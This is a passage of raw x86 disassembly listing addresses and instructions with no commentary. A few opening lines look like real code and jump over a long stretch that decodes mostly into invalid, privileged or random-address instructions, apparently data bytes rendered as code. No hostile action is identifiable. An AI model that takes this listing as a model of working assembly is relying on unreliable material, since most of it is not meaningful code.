  41c908:	mov    eax,DWORD PTR [eax]
  41c90a:	cmp    eax,DWORD PTR [ecx]
  41c90c:	jne    0x41d531
  41c912:	mov    BYTE PTR [esp+0x2c],0x20
  41c917:	mov    BYTE PTR [esp+0x38],0x3
  41c91c:	mov    BYTE PTR [esp+0x3c],0x6d
  41c921:	mov    BYTE PTR [esp+0x2b],0x90
  41c926:	mov    al,BYTE PTR [esp+0x2b]
  41c92a:	jmp    0x41ccf9
  41c92f:	push   ebp
  41c930:	and    al,0x97
  41c932:	shl    DWORD PTR [esi-0x5e],cl
  41c935:	push   ebp
  41c936:	and    dh,ch
  41c938:	jmp    DWORD PTR [ebx-0x44]
  41c93b:	(bad)  
  41c93c:	out    dx,eax
  41c93d:	mov    ecx,0x166bef7c
  41c942:	sbb    BYTE PTR [edx+edx*1-0x7b19e7e8],bh
  41c949:	nop
  41c94a:	loopne 0x41c8f9
  41c94c:	jl     0x41c917
  41c94e:	ss jnp 0x41c8d8
  41c951:	test   BYTE PTR [ebx+0xe81590e],0x5
  41c958:	clc    
  41c959:	and    dl,cl
  41c95b:	xor    al,0xb5
  41c95d:	mov    dl,BYTE PTR [esi-0x1f16a47d]
  41c963:	mov    dh,0x4b
  41c965:	jmp    0x90c096e2
  41c96a:	jnp    0x41c902
  41c96c:	ja     0x41c990
  41c96e:	xchg   ebx,eax
  41c970:	push   0xda7209d6
  41c975:	push   es
  41c976:	je     0x41c9eb
  41c978:	pop    ds
  41c979:	xor    DWORD PTR [ebx],0xe38c2ad
  41c97f:	adc    DWORD PTR ds:0x15826eb8,esp
  41c985:	pop    ss
  41c986:	mov    ds:0xa1a1f234,al
  41c98b:	cmp    BYTE PTR [eax],ah
  41c98d:	mov    ds:0x5eb85804,al
  41c992:	mov    ds:0x2ba79426,al
  41c997:	scas   eax,DWORD PTR es:[edi]
  41c998:	sub    eax,edx
  41c99a:	jmp    0x41c9d9
  41c99c:	sub    eax,0x25289426
  41c9a1:	loop   0x41c981
  41c9a3:	push   es
  41c9a4:	jl     0x41c9bf
  41c9a6:	ins    BYTE PTR es:[edi],dx
  41c9a7:	mov    edx,0x30ea37df
  41c9ac:	xor    DWORD PTR [ebx],esp
  41c9ae:	loope  0x41c97d
  41c9b0:	ret    0xc891
  41c9b3:	xor    bl,BYTE PTR [ebp+0x12]
  41c9b6:	mov    DWORD PTR [esi],ecx
  41c9b8:	addr16 xchg edx,eax
  41c9ba:	inc    ecx
  41c9bb:	mov    al,ds:0x50daaa9e
  41c9c0:	call   0x780:0x927416fc
  41c9c7:	ds xchg esp,eax
  41c9c9:	sbb    ecx,DWORD PTR [esi]
  41c9cb:	push   ss
  41c9cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9cd:	pop    ebp
  41c9ce:	push   eax
  41c9cf:	into   
  41c9d0:	in     al,dx
  41c9d1:	call   0x8ac5:0x122d5c70
  41c9d8:	inc    ebp
  41c9d9:	lods   eax,DWORD PTR ds:[esi]
  41c9da:	aaa    
  41c9db:	add    edx,DWORD PTR [edx-0x126c033c]
  41c9e1:	fs cmp eax,0x8997b1fb
  41c9e7:	fadd   st(4),st
  41c9e9:	scas   eax,DWORD PTR es:[edi]
  41c9ea:	push   ebx
  41c9eb:	(bad)  
  41c9ec:	mov    ds:0x7dae44ac,al
  41c9f1:	dec    edx
  41c9f2:	mov    BYTE PTR [eax],dh
  41c9f4:	xchg   BYTE PTR [eax-0x373f14d4],ah
  41c9fa:	(bad)  
  41c9fb:	fidiv  WORD PTR [ebx]
  41c9fd:	dec    ebp
  41c9fe:	jbe    0x41c9a6
  41ca00:	cmp    ch,BYTE PTR [edi+0x619feeb3]
  41ca06:	jp     0x41ca28
  41ca08:	fwait
  41ca09:	mul    al
  41ca0b:	sar    BYTE PTR ds:0xa5f4a42,0x2e
  41ca12:	and    dh,BYTE PTR [eax-0x5f]
  41ca15:	cmc    
  41ca16:	mov    esi,0x48b73e00
  41ca1b:	or     bh,BYTE PTR [eax]
  41ca1d:	scas   eax,DWORD PTR es:[edi]
  41ca1e:	pop    ebx
  41ca1f:	dec    ebx
  41ca20:	das    
  41ca21:	cmc    
  41ca22:	cs pushf 
  41ca24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca25:	pushf  
  41ca26:	inc    ebx
  41ca27:	mov    edx,cs
  41ca29:	cmc    
  41ca2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca2b:	test   al,0x97
  41ca2d:	push   esi
  41ca2e:	fwait
  41ca2f:	dec    eax
  41ca30:	in     eax,0xe5
  41ca32:	cmp    al,0x6
  41ca34:	ds inc edi
  41ca36:	push   esp
  41ca37:	sbb    DWORD PTR [edx-0x23285159],edi
  41ca3d:	idiv   esp
  41ca3f:	ror    DWORD PTR [edi],cl
  41ca41:	mov    eax,ds:0xb82d6aea
  41ca46:	or     ebx,eax
  41ca48:	frstor [eax]
  41ca4a:	push   0xec84a111
  41ca4f:	mov    ebx,ebx
  41ca51:	in     eax,0x61
  41ca53:	jo     0x41ca06
  41ca55:	lods   al,BYTE PTR ds:[esi]
  41ca56:	lock test BYTE PTR [edi-0x26],dh
  41ca5a:	adc    al,0xa2
  41ca5c:	add    al,0xc0
  41ca5e:	mov    ebp,0x9dc417be
  41ca63:	jle    0x41ca67
  41ca65:	je     0x41ca34
  41ca67:	aaa    
  41ca68:	stos   DWORD PTR es:[edi],eax
  41ca69:	sbb    esi,DWORD PTR [eax+0x2546e013]
  41ca6f:	inc    edx
  41ca70:	leave  
  41ca71:	stc    
  41ca72:	imul   ebx,DWORD PTR [ebx],0x6d46b680
  41ca78:	stos   BYTE PTR es:[edi],al
  41ca79:	nop
  41ca7a:	and    dl,ch
  41ca7c:	(bad)  
  41ca7d:	adc    eax,0x5a2e3d4f
  41ca82:	push   cs
  41ca83:	pusha  
  41ca84:	xchg   esi,eax
  41ca85:	outs   dx,DWORD PTR ds:[esi]
  41ca86:	push   0x86a1974e
  41ca8b:	les    esp,FWORD PTR [edi-0x2d]
  41ca8e:	data16 jmp 0x41caca
  41ca91:	and    DWORD PTR [ecx-0x61c7d418],esi
  41ca97:	mov    DWORD PTR [ebp+ecx*8-0x36],esp
  41ca9b:	and    al,0x50
  41ca9d:	pop    esp
  41ca9e:	pop    edi
  41ca9f:	stos   DWORD PTR es:[edi],eax
  41caa0:	in     al,0xfb
  41caa2:	sahf   
  41caa3:	jle    0x41ca90
  41caa5:	mov    ah,0x48
  41caa7:	jmp    0x41cb0f
  41caa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caaa:	mov    edx,0x3b5bdd24
  41caaf:	inc    esp
  41cab0:	fxch   st(5)
  41cab2:	push   ebx
  41cab3:	call   0xb74b:0xce660126
  41caba:	shl    DWORD PTR [ebx-0x4cc061d],cl
  41cac0:	in     eax,dx
  41cac1:	xchg   esp,eax
  41cac2:	(bad)  
  41cac3:	dec    ebx
  41cac4:	sub    al,0x91
  41cac6:	cmp    dh,BYTE PTR [ecx]
  41cac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cac9:	and    DWORD PTR ds:0x72969ee9,edx
  41cacf:	les    esp,FWORD PTR [eax]
  41cad1:	cld    
  41cad2:	push   0x4f22ebd8
  41cad7:	adc    dl,bh
  41cad9:	jae    0x41cab6
  41cadb:	dec    ebp
  41cadc:	push   cs
  41cadd:	push   ss
  41cade:	fidivr WORD PTR [ecx-0x76f8541f]
  41cae4:	xchg   ebx,eax
  41cae5:	jmp    0x1b40:0x606a8fca
  41caec:	mov    ds:0x79413161,al
  41caf1:	adc    esp,ebx
  41caf3:	fcomp  QWORD PTR [ebx-0x29]
  41caf6:	mov    ?,WORD PTR [ebx+0x7042ad3e]
  41cafc:	jecxz  0x41ca8c
  41cafe:	adc    BYTE PTR [eax-0x55223f18],0xf5
  41cb05:	mov    BYTE PTR [eax-0x73ae1332],ah
  41cb0b:	fwait
  41cb0c:	sar    BYTE PTR [edi],0xa
  41cb0f:	daa    
  41cb10:	dec    esi
  41cb11:	lods   al,BYTE PTR ds:[esi]
  41cb12:	mov    dh,0x58
  41cb14:	pop    edx
  41cb15:	add    eax,0x10069bb0
  41cb1a:	fnstenv [ebp+0xbf1a744]
  41cb20:	mov    ch,0xc4
  41cb22:	jns    0x41cb5f
  41cb24:	sti    
  41cb25:	std    
  41cb26:	adc    dl,BYTE PTR [esi+0x2f]
  41cb29:	ss jmp 0x41caec
  41cb2c:	sub    BYTE PTR [ebp+0x13],0x11
  41cb30:	lock loop 0x41cb82
  41cb33:	or     al,0x3a
  41cb35:	cmp    BYTE PTR [ebp+0x5f],bl
  41cb38:	jge    0x41caec
  41cb3a:	mov    bh,BYTE PTR [edi+eax*2+0x2a545eb9]
  41cb41:	pop    es
  41cb42:	or     ebp,ebp
  41cb44:	popaw  
  41cb46:	rcr    BYTE PTR ds:0xcdd6e17f,1
  41cb4c:	in     eax,dx
  41cb4d:	bound  esp,QWORD PTR [edi-0x3c]
  41cb50:	mov    al,0x3a
  41cb52:	cli    
  41cb53:	cmp    esi,ebx
  41cb55:	enter  0x3d4a,0x64
  41cb59:	(bad)  
  41cb5a:	sahf   
  41cb5b:	or     ebx,DWORD PTR [edx]
  41cb5d:	xchg   ebp,eax
  41cb5e:	ja     0x41caf9
  41cb60:	pop    esp
  41cb61:	and    al,0x5a
  41cb63:	jns    0x41cb02
  41cb65:	fldcw  WORD PTR [ebx-0x66c90eb]
  41cb6b:	pop    es
  41cb6c:	pop    ecx
  41cb6d:	loop   0x41cbbb
  41cb6f:	outs   dx,DWORD PTR cs:[esi]
  41cb71:	lods   eax,DWORD PTR ds:[esi]
  41cb72:	mov    al,0x59
  41cb74:	mov    ebp,0xc4f11b98
  41cb79:	cmp    al,0x7c
  41cb7b:	loope  0x41cb56
  41cb7d:	shl    BYTE PTR [ebp+0x8a0d8db],cl
  41cb83:	push   ebx
  41cb84:	scas   al,BYTE PTR es:[edi]
  41cb85:	mov    bl,0x4c
  41cb87:	(bad)  
  41cb88:	ret    0xea1c
  41cb8b:	fwait
  41cb8c:	xchg   eax,eax
  41cb8e:	adc    DWORD PTR [esi-0x1f4da1f2],esi
  41cb94:	mov    ebx,fs
  41cb96:	and    eax,0xa4b3f97b
  41cb9b:	(bad)  
  41cb9c:	pop    ebp
  41cb9d:	stos   BYTE PTR es:[edi],al
  41cb9e:	sahf   
  41cb9f:	sbb    al,0x7b
  41cba1:	cvtps2pi mm7,xmm7
  41cba4:	jge    0x41cbae
  41cba6:	mov    edi,0x3f277070
  41cbab:	mov    eax,ds:0xba721d6c
  41cbb0:	iret   
  41cbb1:	ja     0x41cc2e
  41cbb3:	pxor   mm1,QWORD PTR [edi]
  41cbb6:	mov    cl,0xe8
  41cbb8:	mov    bh,0x24
  41cbba:	sub    eax,0x966b03dd
  41cbbf:	(bad)  
  41cbc0:	jo     0x41cbb3
  41cbc2:	xchg   ebx,eax
  41cbc3:	test   DWORD PTR [ecx+0x3e64a6db],eax
  41cbc9:	lods   eax,DWORD PTR ds:[esi]
  41cbca:	cbw    
  41cbcc:	cwde   
  41cbcd:	in     al,dx
  41cbce:	dec    ebp
  41cbcf:	(bad)  
  41cbd0:	in     al,dx
  41cbd1:	aas    
  41cbd2:	aaa    
  41cbd3:	pop    eax
  41cbd4:	rcr    DWORD PTR [edi-0x5c],1
  41cbd7:	cwde   
  41cbd8:	jl     0x41cc34
  41cbda:	and    al,0x45
  41cbdc:	(bad)  
  41cbdd:	aad    0x42
  41cbdf:	mov    bh,0xee
  41cbe1:	pop    ebp
  41cbe2:	ret    
  41cbe3:	mov    ah,0xeb
  41cbe5:	cli    
  41cbe6:	adc    edi,ebx
  41cbe8:	loope  0x41cbe2
  41cbea:	or     eax,0x3c014b22
  41cbef:	sbb    bh,cl
  41cbf1:	pop    esi
  41cbf2:	cdq    
  41cbf3:	xor    bh,BYTE PTR es:[edi-0x4a025099]
  41cbfa:	arpl   si,ax
  41cbfc:	loopne 0x41cbb0
  41cbfe:	dec    dl
  41cc00:	jbe    0x41cc81
  41cc02:	aaa    
  41cc03:	lds    esp,FWORD PTR [edx]
  41cc05:	push   ecx
  41cc06:	int3   
  41cc07:	rcl    DWORD PTR [edi-0x7d3676b1],cl
  41cc0d:	or     eax,eax
  41cc0f:	in     eax,0xa3
  41cc11:	shl    BYTE PTR [esi+ebp*4],1
  41cc14:	out    dx,al
  41cc15:	enter  0xf1b1,0x8
  41cc19:	jno    0x41cbe6
  41cc1b:	dec    edx
  41cc1c:	add    ah,BYTE PTR [esi]
  41cc1e:	loopne 0x41cc7a
  41cc20:	mov    edx,0x5db95ba2
  41cc25:	xchg   ebx,eax
  41cc26:	lds    eax,FWORD PTR [ecx+ecx*4+0x58679868]
  41cc2d:	scas   eax,DWORD PTR es:[edi]
  41cc2e:	aam    0x8e
  41cc30:	push   ecx
  41cc31:	or     eax,0x2c0d8bb6
  41cc36:	gs or  eax,0x24e41641
  41cc3c:	push   ebx
  41cc3d:	and    edi,ebx
  41cc3f:	dec    eax
  41cc40:	icebp  
  41cc41:	sbb    ebx,0xa2ff9ab5
  41cc47:	or     eax,0xbcf4b38f
  41cc4c:	dec    esi
  41cc4d:	or     eax,0x19176f2f
  41cc52:	scas   al,BYTE PTR es:[edi]
  41cc53:	add    bl,BYTE PTR [ebp-0x62]
  41cc56:	add    DWORD PTR [edx],esp
  41cc58:	cld    
  41cc59:	and    DWORD PTR ds:0x6d7a21d8,0x52
  41cc60:	mov    cs,WORD PTR [edx-0x2e]
  41cc63:	dec    ebp
  41cc64:	clc    
  41cc65:	repnz adc eax,0xac454703
  41cc6b:	scas   al,BYTE PTR es:[edi]
  41cc6c:	adc    BYTE PTR [ebx+0x432e7822],bl
  41cc72:	in     al,dx
  41cc73:	push   ds
  41cc74:	lods   eax,DWORD PTR ds:[esi]
  41cc75:	sti    
  41cc76:	aas    
  41cc77:	jmp    0xeb02e9a
  41cc7c:	push   ecx
  41cc7d:	push   DWORD PTR [edx+0x7cf26e97]
  41cc83:	cmp    al,0xb3
  41cc85:	les    ecx,FWORD PTR [esi+eiz*4+0x61]
  41cc89:	jbe    0x41cce6
  41cc8b:	pop    eax
  41cc8c:	push   edx
  41cc8d:	daa    
  41cc8e:	mov    ds:0x76be5a20,eax
  41cc93:	inc    esp
  41cc94:	adc    bh,BYTE PTR [eax]
  41cc96:	mov    ah,0x2e
  41cc98:	pusha  
  41cc99:	xlat   BYTE PTR ds:[ebx]
  41cc9a:	mov    WORD PTR [edx+0x4a1a4f1a],ds
  41cca0:	and    al,0x4c
  41cca2:	psubusw mm1,QWORD PTR [bx+0x3f57]
  41cca8:	repnz or al,0x4d
  41ccab:	sub    BYTE PTR [edi+edi*4],0x4
  41ccaf:	ret    0x4364
  41ccb2:	sub    al,0x77
  41ccb4:	and    dh,BYTE PTR [ecx+0x18d8e753]
  41ccba:	cmp    al,0xa
  41ccbc:	mov    edx,eax
  41ccbe:	sbb    BYTE PTR [edx+0x62],bl
  41ccc1:	add    ah,ah
  41ccc3:	arpl   WORD PTR [esi+0x63b4c490],dx
  41ccc9:	jmp    0x41cc72
  41cccb:	inc    ecx
  41cccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cccd:	stos   BYTE PTR es:[edi],al
  41ccce:	jmp    0x7b3f4401
  41ccd3:	push   edi
  41ccd4:	pop    esp
  41ccd5:	rcl    BYTE PTR [edi-0x3971be9c],1
  41ccdb:	jbe    0x41cd34
  41ccdd:	mov    esi,esi
  41ccdf:	out    0x83,al
  41cce1:	push   cs
  41cce2:	mov    bh,0xd3
  41cce4:	mov    ebx,0x4b96c5e0
  41cce9:	mov    dl,0x59
  41cceb:	pop    esi
  41ccec:	inc    esp
  41cced:	repz mov ah,0xcc
  41ccf0:	lds    edi,FWORD PTR [edx+0x7093beb3]
  41ccf6:	cmp    BYTE PTR [eax],0x66
  41ccf9:	mov    cl,BYTE PTR [esp+0x3c]
  41ccfd:	or     al,0xdc
  41ccff:	jmp    0x41d0ce
  41cd04:	fimul  WORD PTR [esi+0x16]
  41cd07:	jle    0x41cd30
  41cd09:	ds pop esi
  41cd0b:	cs je  0x41cd75
  41cd0e:	xchg   edi,eax
  41cd0f:	mov    esp,0xbe0016de
  41cd14:	xchg   ebx,eax
  41cd15:	arpl   WORD PTR [esi],dx
  41cd17:	sbb    BYTE PTR [edx+edx*1-0x1797e7e8],bh
  41cd1e:	lods   eax,DWORD PTR ds:[esi]
  41cd1f:	clc    
  41cd20:	add    ebp,esi
  41cd22:	jmp    0xaa873d41
  41cd27:	iret   
  41cd28:	and    ebp,DWORD PTR [edx+0x65330b4c]
  41cd2e:	and    esi,DWORD PTR [edx+0x64]
  41cd31:	xor    BYTE PTR [esi-0x58],ch
  41cd34:	or     DWORD PTR [edx],ebx
  41cd36:	sub    cl,BYTE PTR [ecx]
  41cd38:	mov    eax,0xc217e042
  41cd3d:	shl    BYTE PTR [ecx+eax*8+0x7d],0x80
  41cd42:	mov    cl,0x2
  41cd44:	adc    DWORD PTR [eax-0x55],edi
  41cd47:	mov    esi,0x4d2f6c45
  41cd4c:	adc    DWORD PTR [ecx-0x285d72],ecx
  41cd52:	mov    bh,0x3d
  41cd54:	repnz pop eax
  41cd56:	sbb    eax,0x499af426
  41cd5b:	or     eax,0x2665e6f8
  41cd60:	jl     0x41cd75
  41cd62:	mov    al,0xbd
  41cd64:	(bad)  
  41cd65:	pop    ecx
  41cd66:	fst    DWORD PTR [esi+esi*4]
  41cd69:	outs   dx,DWORD PTR ds:[esi]
  41cd6a:	sbb    esp,DWORD PTR [ebp-0x6358aece]
  41cd70:	pushf  
  41cd71:	inc    eax
  41cd72:	lods   al,BYTE PTR ds:[esi]
  41cd73:	mov    ds:0x3811f1fb,eax
  41cd78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd79:	jecxz  0x41cda5
  41cd7b:	ins    DWORD PTR es:[edi],dx
  41cd7c:	ret    0x2a23
  41cd7f:	push   0xffffffab
  41cd81:	mov    esi,0x29f6730f
  41cd86:	pop    ebp
  41cd87:	sub    eax,0x9c2d6da5
  41cd8c:	neg    bl
  41cd8e:	sbb    edi,DWORD PTR [esi+0x60d3a992]
  41cd94:	mov    WORD PTR [edx-0x57],gs
  41cd97:	add    ah,dl
  41cd99:	popa   
  41cd9a:	jle    0x41cd8b
  41cd9c:	pop    esp
  41cd9d:	retf   0x4bcc
  41cda0:	icebp  
  41cda1:	pop    es
  41cda2:	sbb    DWORD PTR [eax-0x4e],ecx
  41cda5:	push   ds
  41cda6:	leave  
  41cda7:	in     al,0x17
  41cda9:	cld    
  41cdaa:	cdq    
  41cdab:	repz ds mov bl,0x40
  41cdaf:	mov    ebx,?
  41cdb1:	fidivr WORD PTR [esi-0x7a1d212]
  41cdb7:	xchg   ecx,eax
  41cdb8:	das    
  41cdb9:	int3   
  41cdba:	cli    
  41cdbb:	inc    ebx
  41cdbc:	pop    ebx
  41cdbd:	out    0xb1,al
  41cdbf:	inc    edi
  41cdc0:	sbb    al,BYTE PTR [eax+0x7f]
  41cdc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdc4:	mov    ah,0x31
  41cdc6:	push   ebx
  41cdc7:	repz ret 
  41cdc9:	xchg   ebx,eax
  41cdca:	or     ecx,edi
  41cdcc:	retf   
  41cdcd:	pop    eax
  41cdce:	push   ebx
  41cdcf:	add    eax,0x3fc00176
  41cdd4:	mov    ah,ch
  41cdd6:	lds    ebx,FWORD PTR [eax+0x6c]
  41cdd9:	mov    ah,0x10
  41cddb:	jnp    0x41ce24
  41cddd:	(bad)  
  41cdde:	xor    DWORD PTR [ebx+esi*2],ebp
  41cde1:	xor    eax,DWORD PTR [esi+0xdea7cf]
  41cde7:	mov    WORD PTR [ecx-0x3d],?
  41cdea:	xchg   ebp,eax
  41cdeb:	xor    ebp,DWORD PTR [esi-0x5b]
  41cdee:	or     eax,0x101592ec
  41cdf3:	push   esi
  41cdf4:	sub    eax,DWORD PTR [edx+0x34735a77]
  41cdfa:	dec    edx
  41cdfb:	mov    esi,0xb3c7aeb7
  41ce00:	rol    DWORD PTR [edx+0x1e],1
  41ce03:	and    edi,0xf64aa46d
  41ce09:	sbb    esp,DWORD PTR [ecx]
  41ce0b:	jmp    0xdcf2bdcf
  41ce10:	cmp    edx,ebp
  41ce12:	jge    0x41cdf4
  41ce14:	outs   dx,BYTE PTR ds:[esi]
  41ce15:	push   es
  41ce16:	adc    DWORD PTR [edx],edx
  41ce18:	mov    DWORD PTR [ebx+0x2ff629b],0x1835d6a5
  41ce22:	std    
  41ce23:	dec    eax
  41ce24:	in     al,dx
  41ce25:	into   
  41ce26:	sbb    eax,0x57efbce1
  41ce2b:	dec    edi
  41ce2c:	out    0x63,al
  41ce2e:	test   BYTE PTR [esi+0x6a],dl
  41ce31:	daa    
  41ce32:	push   edx
  41ce33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce34:	push   ebp
  41ce35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce36:	mov    cl,0x7e
  41ce38:	jns    0x41ce70
  41ce3a:	mov    dl,0xd0
  41ce3c:	(bad)  
  41ce3d:	jae    0x41ce15
  41ce3f:	push   0x6e554e8f
  41ce44:	leave  
  41ce45:	xchg   ebp,eax
  41ce46:	pusha  
  41ce47:	adc    ebx,edi
  41ce49:	(bad)  
  41ce4a:	call   0xea9de706
  41ce4f:	mov    ah,BYTE PTR [edi-0x30d4e3bd]
  41ce55:	mov    cl,0xdd
  41ce57:	imul   DWORD PTR [edx+edi*1+0x7a]
  41ce5b:	mov    ecx,0x6ce356ea
  41ce60:	xor    cl,BYTE PTR [edx]
  41ce62:	fs lahf 
  41ce64:	jge    0x41ce67
  41ce66:	adc    dl,BYTE PTR [edx-0x26]
  41ce69:	jae    0x41cded
  41ce6b:	push   0x49
  41ce6d:	pop    ebx
  41ce6e:	(bad)  ds:0x40c3e8ae
  41ce74:	dec    edx
  41ce75:	jno    0x41ce8e
  41ce77:	ins    BYTE PTR es:[edi],dx
  41ce78:	sti    
  41ce79:	je     0x41cee1
  41ce7b:	arpl   WORD PTR [edi+0x6801d389],di
  41ce81:	cmp    edi,ecx
  41ce83:	mov    ah,0xf8
  41ce85:	out    0x8d,al
  41ce87:	push   ebp
  41ce88:	(bad)  
  41ce89:	xchg   esp,eax
  41ce8a:	jp     0x41ce85
  41ce8c:	push   ss
  41ce8d:	xor    cl,BYTE PTR [eax+0x63]
  41ce90:	repnz mov edi,0xfed5e8b4
  41ce96:	or     ebp,ebp
  41ce98:	and    edx,ebx
  41ce9a:	sub    eax,0xcd5659e7
  41ce9f:	adc    dh,BYTE PTR [ebx+0x5b127fbf]
  41cea5:	jmp    0x30d3e7f6
  41ceaa:	jl     0x41ceb6
  41ceac:	(bad)  
  41cead:	retf   
  41ceae:	xchg   DWORD PTR [ebx-0x3c8f2b9d],ebp
  41ceb4:	lds    ebx,FWORD PTR [edx+0x68]
  41ceb7:	pop    esp
  41ceb8:	cmp    DWORD PTR [ecx-0x4e],edi
  41cebb:	je     0x41cee7
  41cebd:	cs jnp 0x41cf10
  41cec0:	fsub   QWORD PTR [edx]
  41cec2:	mov    al,BYTE PTR [ebx-0x3]
  41cec5:	out    0x34,eax
  41cec7:	mov    edx,0xdee85443
  41cecc:	add    esi,eax
  41cece:	in     eax,dx
  41cecf:	retf   
  41ced0:	jp     0x41cf20
  41ced2:	int3   
  41ced3:	je     0x41cf45
  41ced5:	mov    ?,WORD PTR [edi-0x202de34]
  41cedb:	add    edx,DWORD PTR [ebx+0x6e]
  41cede:	test   eax,0x1591cb42
  41cee3:	cmp    al,0x9c
  41cee5:	mov    ds:0xa4adbcfb,eax
  41ceea:	inc    edi
  41ceeb:	(bad)  
  41ceec:	je     0x41ced1
  41ceee:	inc    ecx
  41ceef:	or     al,0x6a
  41cef1:	jnp    0x41cead
  41cef3:	fisubr WORD PTR [ebx-0x1cac873a]
  41cef9:	lock out 0x6a,al
  41cefc:	fsubr  st(3),st
  41cefe:	aaa    
  41ceff:	xor    BYTE PTR [eax-0x65a835d4],al
  41cf05:	inc    edi
  41cf06:	ret    
  41cf07:	ss cmp bh,BYTE PTR es:0xb7c92a0e
  41cf0f:	mov    ch,al
  41cf11:	ja     0x41cf08
  41cf13:	xchg   eax,edx
  41cf15:	shr    BYTE PTR [ebx-0x746b785],0x1c
  41cf1c:	bnd jg 0x41ceaf
  41cf1f:	sbb    al,0x83
  41cf21:	push   es
  41cf22:	jmp    0x41cebe
  41cf24:	pop    eax
  41cf25:	clc    
  41cf26:	jmp    0x41cf24
  41cf28:	mov    ecx,0xc2276a11
  41cf2d:	cmc    
  41cf2e:	sbb    ebx,edi
  41cf30:	pop    ebx
  41cf31:	fisub  WORD PTR [ecx]
  41cf33:	push   ss
  41cf34:	push   edx
  41cf35:	pop    ebx
  41cf36:	sbb    dl,BYTE PTR [edx+0x44d49a00]
  41cf3c:	(bad)  
  41cf3d:	mov    esp,0xafafb3fb
  41cf42:	leave  
  41cf43:	cwde   
  41cf44:	cmp    al,0x2a
  41cf46:	imul   ecx,edi,0xffffffe3
  41cf49:	neg    BYTE PTR [edx]
  41cf4b:	pop    edi
  41cf4c:	fsubp  st(0),st
  41cf4e:	aad    0x97
  41cf50:	xor    DWORD PTR [edx],0xf8522420
  41cf56:	jle    0x41ceee
  41cf58:	aam    0x1f
  41cf5a:	jno    0x41cfa1
  41cf5c:	and    dh,bl
  41cf5e:	out    dx,al
  41cf5f:	dec    esi
  41cf60:	(bad)
  41cf63:	push   ds
  41cf64:	jg     0x41cf34
  41cf66:	xchg   dh,al
  41cf68:	or     BYTE PTR [esi-0x5a],0x5b
  41cf6c:	push   es
  41cf6d:	mov    eax,0xfe7fd172
  41cf72:	icebp  
  41cf73:	or     BYTE PTR [ebx+0x70],ah
  41cf76:	sub    al,0x4a
  41cf78:	leave  
  41cf79:	cmp    BYTE PTR [ebx],bh
  41cf7b:	push   esp
  41cf7c:	lods   al,BYTE PTR ds:[esi]
  41cf7d:	pop    edx
  41cf7e:	push   eax
  41cf7f:	push   ebp
  41cf80:	cmp    ebp,DWORD PTR [eax]
  41cf82:	add    ebp,0x796e11dc
  41cf88:	mov    ebp,0xac6db150
  41cf8d:	enter  0x57f1,0x9a
  41cf91:	ins    BYTE PTR es:[edi],dx
  41cf92:	into   
  41cf93:	daa    
  41cf94:	icebp  
  41cf95:	aad    0x7e
  41cf97:	out    dx,eax
  41cf98:	test   al,0x86
  41cf9a:	ret    
  41cf9b:	push   ebx
  41cf9c:	mov    edi,0x94d604d3
  41cfa1:	and    ah,BYTE PTR ds:0x1c5751a0
  41cfa7:	ins    BYTE PTR es:[edi],dx
  41cfa8:	mov    al,ds:0xf432ba7
  41cfad:	rol    DWORD PTR [edx+eax*8],1
  41cfb0:	push   ecx
  41cfb1:	pushf  
  41cfb2:	push   es
  41cfb3:	push   eax
  41cfb4:	out    0xf3,al
  41cfb6:	popf   
  41cfb7:	adc    DWORD PTR [esi],esi
  41cfb9:	push   edi
  41cfba:	cmp    al,0xba
  41cfbc:	(bad)  
  41cfbd:	cli    
  41cfbe:	mov    esi,0xb780d7e1
  41cfc3:	sbb    BYTE PTR [edi+0x10],ch
  41cfc6:	lods   eax,DWORD PTR ds:[esi]
  41cfc7:	ins    DWORD PTR es:[edi],dx
  41cfc8:	jnp    0x41d039
  41cfca:	and    al,0x22
  41cfcc:	mov    ebx,0xcdb2f2ee
  41cfd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfd2:	(bad)  
  41cfd3:	fs push ss
  41cfd5:	mov    bh,0x4a
  41cfd7:	sbb    DWORD PTR [edi-0x262e1ff4],0xd2ae4907
  41cfe1:	pop    ds
  41cfe2:	cli    
  41cfe3:	in     al,dx
  41cfe4:	sti    
  41cfe5:	in     eax,0x74
  41cfe7:	int    0x81
  41cfe9:	mov    bh,BYTE PTR [edi*2+0x151fe3e3]
  41cff0:	cld    
  41cff1:	lods   eax,DWORD PTR ds:[esi]
  41cff2:	sbb    al,0xbe
  41cff4:	dec    esi
  41cff5:	leave  
  41cff6:	cld    
  41cff7:	pop    ebx
  41cff8:	xor    BYTE PTR [esi],0x5a
  41cffb:	lock jle 0x41cfa5
  41cffe:	jae    0x41d03f
  41d000:	add    DWORD PTR [eax-0x6d4c91b8],esp
  41d006:	cs sbb ebp,eax
  41d009:	clc    
  41d00a:	or     eax,0xe3c37e8
  41d00f:	lock jae 0x41cfdb
  41d012:	test   BYTE PTR [ebx],0x28
  41d015:	mov    DWORD PTR ds:0x89b26050,edx
  41d01b:	test   BYTE PTR [edi],dl
  41d01d:	add    eax,0x1bb45876
  41d022:	lahf   
  41d023:	repz icebp 
  41d025:	cwde   
  41d026:	cli    
  41d027:	cmp    dh,BYTE PTR [eax+0x4365a3cd]
  41d02d:	inc    esi
  41d02e:	sbb    BYTE PTR fs:[ebx+esi*2+0x50429f87],ah
  41d036:	jmp    0xf79cb19b
  41d03b:	scas   eax,DWORD PTR es:[edi]
  41d03c:	mov    cl,0x2
  41d03e:	repz call 0xdd6a9f89
  41d044:	mov    eax,0x91194a4a
  41d049:	sub    DWORD PTR [ebx+0x31a20de2],esp
  41d04f:	dec    eax
  41d050:	sbb    bh,BYTE PTR [esi-0x5f]
  41d053:	jle    0x41cfda
  41d055:	outs   dx,BYTE PTR ds:[esi]
  41d056:	call   0xaf7b8061
  41d05b:	sub    ebp,DWORD PTR [edi+0x41]
  41d05e:	inc    edi
  41d05f:	sbb    BYTE PTR [ebp+0x7df7c7f7],ah
  41d065:	sub    ecx,ebx
  41d067:	xchg   ebp,eax
